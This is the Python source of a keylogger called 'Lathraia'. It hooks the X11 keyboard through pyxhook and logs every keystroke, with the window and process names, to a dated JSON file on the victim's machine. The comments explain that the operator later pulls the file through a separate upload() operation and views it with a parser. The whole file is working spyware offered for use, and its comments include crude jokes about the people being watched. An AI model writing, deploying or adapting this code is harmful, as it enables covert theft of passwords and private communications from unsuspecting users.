# ooooo                      .   oooo                            o8o            
# `888'                    .o8   `888                            `"'            
#  888          .oooo.   .o888oo  888 .oo.   oooo d8b  .oooo.   oooo   .oooo.   
#  888         `P  )88b    888    888P"Y88b  `888""8P `P  )88b  `888  `P  )88b  
#  888          .oP"888    888    888   888   888      .oP"888   888   .oP"888  
#  888       o d8(  888    888 .  888   888   888     d8(  888   888  d8(  888  
#  o888ooooood8 `Y888""8o   "888" o888o o888o d888b    `Y888""8o o888o `Y888""8o 

# This is the Lathraia keylogger. It logs every key stroke, records the window and its process name, and
# writes it into a JSON (sqlite would have been slightly better) file for complex parsing. 
# The JSON file is written to a local directory on the host machine. You are then required to
# download it and use the reader/parser to view the logs. 

import pyxhook
import Xlib
import os
import sys
import json
import time

from pyxhook import *
from datetime import date

from configuration import *

# Directory setup
if (not os.path.exists(KEYLOGGER_FOLDER_LOCATION)):
    os.mkdir(KEYLOGGER_FOLDER_LOCATION)

# Format the keylogger location name
KEYLOGGER_LOG_LOCATION = KEYLOGGER_LOG_LOCATION.format(
    date = date.today()
)

# Variables
window_name = "" # Store the window name
window_proc_name = "" # Store the window's process name.
keys = "" # Store the collection of keys pressed before the window process name changes
json_table = "" # Store the JSON table which we are constantly reading and writing from!

# You may change some attributes here
# Change whatever you please!

# This takes some of the ambiguous key names and translates them into ones which are meaningful and special!
# b-b-but what if I type "[Space]" on the host machine.
# Fuck off, don't ask. You know what happens, and if you don't want it to happen, take the wheel
# and implement a way to get around that. There's no point in one doing that anyway.

translate_table = {
    "space": "[Space]",
    "Return": "[Enter]",
    "BackSpace": "[Backspace]"
}

# If the file does not exist, create the skeleton for it.
if (not os.path.isfile(KEYLOGGER_LOG_LOCATION)):
    json_table = [
      {
        "procname": "_start",
        "windowname": "_start",
        "keys": "_start",
        "time": "_start"
      }
    ]
    

    open(KEYLOGGER_LOG_LOCATION, "w+").write(json.dumps(json_table))

# Load our preexisting and/or new keylogs file
# And yes, we are storing as JSON for formatting and convenience purposes.
# ">not using sqlite"
# Bloat. All I have to say.

json_table = json.loads(open(KEYLOGGER_LOG_LOCATION, "r").read())

# Translate ambiguous and/or non-formatted keys into paramount ones.
def translate(key):
    if (key in translate_table):
      return translate_table[key]
    else:
      return key

# This event is, needless to say, called on every keyboard event.
def OnKeyboardEvent(event):
  
  try:
    # Global declarations
    global window_name
    global window_proc_name
    global keys
    global KEYLOGGER_LOG_LOCATION

    # The reason why we are setting it every time is so that once another date hits, it writes to
    # another file. Yes, there are some fat weeaboos out there who will use their computers for days.

    KEYLOGGER_LOG_LOCATION = KEYLOGGER_LOG_LOCATION.format(
      date = date.today()
    )

    sys.stdout.flush()

    # If one of them is not the same, make changes.
    if ((window_proc_name != event.WindowProcName) or (window_name != event.WindowName)):
      json_table.append(
          {
            "procname": window_proc_name,
            "windowname": window_name,
            "keys": keys,
            "time": time.time()
          }
      )
      keys = ""
      open(KEYLOGGER_LOG_LOCATION, "w+").write(json.dumps(json_table))

    window_name = event.WindowName
    window_proc_name = event.WindowProcName

    keys = keys + translate(event.Key)
  except Exception as error:
    print(str(error))

def main():
  # This program is simpler than the others.
  # Actually, really simpler.
  # There are no socket connections to be made. When you want a keylog, just use the upload()
  # operation on one of them where you know where it is. Then, use the keylog analyzer to view them.

  # Initalize everything

  new_hook = HookManager()

  # Set the events to scan
  new_hook.KeyDown = OnKeyboardEvent

  # Hook the keyboard
  new_hook.HookKeyboard()

  # Start it!
  new_hook.start()

if __name__ == "__main__":
    main()
